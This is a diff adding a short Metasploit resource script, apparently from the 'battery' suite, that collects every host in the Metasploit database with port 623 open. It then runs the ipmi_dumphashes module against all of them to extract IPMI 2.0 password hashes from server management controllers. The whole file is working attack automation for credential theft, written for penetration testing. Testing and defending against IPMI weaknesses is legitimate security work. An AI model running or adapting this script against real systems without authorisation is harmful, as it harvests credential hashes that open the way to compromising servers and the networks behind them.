@@ -1,0 +1,49 @@
+<ruby>
+=begin
+  Name:  battery/ipmi_hashdump.rc
+    This script is intended to be used with the Metasploit Framework as a part of the battery suite of resource scripts
+    For more information see:
+      Battery Resource Scripts: https://github.com/kn0/battery
+      Metasploit Framework:  https://github.com/rapid7/metasploit-framework
+
+  Author: kn0
+    twitter: @TrentonIvey
+    email: "Trenton.Ivey@example.com".gsub(/example/,'gmail')
+    web: kn0.ninja
+
+  Description:
+    This Metasploit RC-File is used to attempt to gain hashes from IPMI 2.0 compatible systems
+    It does so by using auxiliary/scanner/ipmi/ipmi_dumphashes against all discovered IPMI services
+    Targets are chosen by matching service with open ports 623/tcp and 623/udp
+=end
+
+# Print Header
+print_status "Using auxiliary/scanner/ipmi/ipmi_dumphashes"
+  
+# Get a list of target services
+targets = []
+begin
+  framework.db.services.each do |service|
+    if ( service.port.eql? 623 and service.state.eql? 'open')
+      targets << service.host.address
+    end
+  end
+  # Remove any duplicate entries
+  targets.uniq!
+rescue ActiveRecord::ConnectionNotEstablished
+  puts "DB not connected..."
+  return
+end
+
+if targets.empty?
+  print_warning "No targets found"
+else
+  # Setup the module
+  self.run_single("use auxiliary/scanner/ipmi/ipmi_dumphashes")
+  self.run_single("set ShowProgress false")
+  self.run_single("set VERBOSE true")
+  
+  self.run_single("set RHOSTS '#{targets.join(' ')}'")
+  self.run_single("run")
+end
+</ruby>
